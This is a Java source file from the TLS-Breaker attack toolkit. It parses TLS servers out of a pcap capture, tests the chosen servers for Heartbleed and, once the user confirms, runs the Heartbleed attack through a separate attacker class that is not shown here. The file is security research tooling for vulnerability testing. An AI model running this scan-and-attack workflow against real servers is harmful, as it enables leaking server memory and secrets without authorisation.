/**
 * TLS-Breaker - A tool collection of various attacks on TLS based on TLS-Attacker
 *
 * Copyright 2021-2022 Ruhr University Bochum, Paderborn University, Hackmanit GmbH
 *
 * Licensed under Apache License, Version 2.0
 * http://www.apache.org/licenses/LICENSE-2.0.txt
 */

package de.rub.nds.tlsbreaker.heartbleed.impl;

import static de.rub.nds.tlsattacker.util.ConsoleLogger.CONSOLE;
import static org.apache.commons.lang3.StringUtils.trim;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.Map;
import java.util.Objects;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import de.rub.nds.tlsattacker.core.config.TLSDelegateConfig;
import de.rub.nds.tlsbreaker.breakercommons.attacker.Attacker;
import de.rub.nds.tlsbreaker.breakercommons.attacker.PcapFileHandler;
import de.rub.nds.tlsbreaker.breakercommons.util.pcap.ConsoleInteractor;
import de.rub.nds.tlsbreaker.breakercommons.util.pcap.PcapAnalyzer;
import de.rub.nds.tlsbreaker.breakercommons.util.pcap.PcapSession;
import de.rub.nds.tlsbreaker.breakercommons.util.pcap.ServerSelection;
import de.rub.nds.tlsbreaker.heartbleed.config.HeartbleedCommandConfig;

public class HeartbleedPcapFileHandler implements PcapFileHandler {
    private static final Logger LOGGER = LogManager.getLogger();
    HeartbleedCommandConfig heartbleedCommandConfig;

    public HeartbleedPcapFileHandler(HeartbleedCommandConfig heartbleedCommandConfig) {
        this.heartbleedCommandConfig = heartbleedCommandConfig;
    }

    public void handlePcapFile() {
        PcapAnalyzer pcapAnalyzer = new PcapAnalyzer(heartbleedCommandConfig.getPcapFileLocation());
        List<PcapSession> sessions = pcapAnalyzer.getAllSessions();

        if (!sessions.isEmpty()) {
            ServerSelection serverSelection = new HeartbleedServerSelection(sessions);
            Map<String, List<PcapSession>> serverSessionsMap = serverSelection.getServerSessionsMap();
            List<String> uniqueServers = new ArrayList<>(serverSessionsMap.keySet());
            if (!uniqueServers.isEmpty()) {
                CONSOLE.info("Found " + uniqueServers.size() + " servers from the pcap file.");
                ConsoleInteractor consoleInteractor = new ConsoleInteractor();
                consoleInteractor.displayServerAndSessionCount(uniqueServers, serverSessionsMap);
                String userOption = consoleInteractor.getValidUserSelection(uniqueServers);
                if ("N".equals(userOption)) {
                    CONSOLE.info("Execution of the attack cancelled.");
                } else if ("a".equals(userOption)) {
                    checkVulnerabilityOfAllServersAndDisplay(uniqueServers, heartbleedCommandConfig, serverSessionsMap,
                        consoleInteractor);
                } else if (isCommaSeparatedList(userOption)) {
                    List<String> hosts = new ArrayList<>();
                    Arrays.stream(userOption.split(",")).forEach(
                        serverNumber -> hosts.add(uniqueServers.get(Integer.parseInt(trim(serverNumber)) - 1)));

                    checkVulnerabilityOfAllServersAndDisplay(hosts, heartbleedCommandConfig, serverSessionsMap,
                        consoleInteractor);
                } else {
                    String host = uniqueServers.get(Integer.parseInt(userOption) - 1);
                    LOGGER.info("Selected server: " + host);
                    heartbleedCommandConfig.getClientDelegate().setHost(host);
                    Boolean vulnerability = checkVulnerability(heartbleedCommandConfig);
                    if (Objects.equals(vulnerability, Boolean.TRUE)) {
                        CONSOLE.info("Server " + host + " is vulnerable.");
                        CONSOLE.info("Do you want to execute the attack? (y/n):");
                        String userResponse = consoleInteractor.getUserYesNoResponse();
                        if ("Y".equals(userResponse)) {
                            executeAttack(host, heartbleedCommandConfig);
                        } else if ("N".equals(userResponse)) {
                            CONSOLE.info("Execution of the attack cancelled.");
                        }
                    } else {
                        CONSOLE.info("The server " + host + " is not vulnerable.");
                    }
                }
            } else {
                CONSOLE.info("\nFound no potential servers for the Heartbleed attack.");
            }
        } else {
            CONSOLE.info("No TLS handshake message found.");
        }
    }

    private void checkVulnerabilityOfAllServersAndDisplay(List<String> uniqueServers,
        HeartbleedCommandConfig heartbleedCommandConfig, Map<String, List<PcapSession>> serverSessionsMap,
        ConsoleInteractor consoleInteractor) {
        List<String> vulnerableServers = getVulnerableServers(uniqueServers, heartbleedCommandConfig);
        CONSOLE.info("Found " + vulnerableServers.size() + "  vulnerable server.");
        if (!vulnerableServers.isEmpty()) {
            consoleInteractor.displayServerAndSessionCount(vulnerableServers, serverSessionsMap);
        }
        if (vulnerableServers.size() == 1) {
            CONSOLE.info("Do you want to execute the attack? (y/n):");
            String userResponse = consoleInteractor.getUserYesNoResponse();
            if ("Y".equals(userResponse)) {
                String host = vulnerableServers.get(0);
                executeAttack(host, heartbleedCommandConfig);
            } else if ("N".equals(userResponse)) {
                CONSOLE.info("Execution of the attack cancelled.");
            }
        } else if (vulnerableServers.size() > 1) {
            CONSOLE.info("Please select a server number to execute an attack.");
            CONSOLE.info("server number: ");
            int serverNumber = consoleInteractor.getUserSelectedServer(uniqueServers);
            String host = uniqueServers.get(serverNumber - 1);
            executeAttack(host, heartbleedCommandConfig);
        }
    }

    private List<String> getVulnerableServers(List<String> uniqueServers,
        HeartbleedCommandConfig heartbleedCommandConfig) {
        List<String> vulnerableServers = new ArrayList<>();
        for (String server : uniqueServers) {
            heartbleedCommandConfig.getClientDelegate().setHost(server);

            Attacker<? extends TLSDelegateConfig> attacker =
                new HeartbleedAttacker(heartbleedCommandConfig, heartbleedCommandConfig.createConfig());

            try {
                Boolean result = attacker.checkVulnerability();
                if (Objects.equals(result, Boolean.TRUE)) {
                    CONSOLE.error("Vulnerable:" + result.toString());
                    vulnerableServers.add(server);
                }
            } catch (UnsupportedOperationException e) {
                LOGGER.info("The selected attacker is currently not implemented");
            }
        }
        return vulnerableServers;
    }

    private void executeAttack(String host, HeartbleedCommandConfig heartbleedCommandConfig) {

        heartbleedCommandConfig.getClientDelegate().setHost(host);
        LOGGER.info("host=" + heartbleedCommandConfig.getClientDelegate().getHost());

        Attacker<? extends TLSDelegateConfig> attacker =
            new HeartbleedAttacker(heartbleedCommandConfig, heartbleedCommandConfig.createConfig());
        try {
            attacker.attack();
        } catch (UnsupportedOperationException e) {
            LOGGER.info("The selected attacker is currently not implemented");
        }
    }

    private boolean isCommaSeparatedList(String userOption) {
        return userOption.contains(",");
    }

    private Boolean checkVulnerability(HeartbleedCommandConfig heartbleedCommandConfig) {
        Attacker<? extends TLSDelegateConfig> attacker =
            new HeartbleedAttacker(heartbleedCommandConfig, heartbleedCommandConfig.createConfig());
        Boolean result = null;
        try {
            result = attacker.checkVulnerability();
            if (Objects.equals(result, Boolean.TRUE)) {
                CONSOLE.error("Vulnerable:" + result.toString());
            } else if (Objects.equals(result, Boolean.FALSE)) {
                CONSOLE.info("Vulnerable:" + result.toString());
            } else {
                CONSOLE.warn("Vulnerable: Uncertain");
            }
        } catch (UnsupportedOperationException e) {
            LOGGER.info("The selected attacker is currently not implemented");
        }
        return result;
    }

}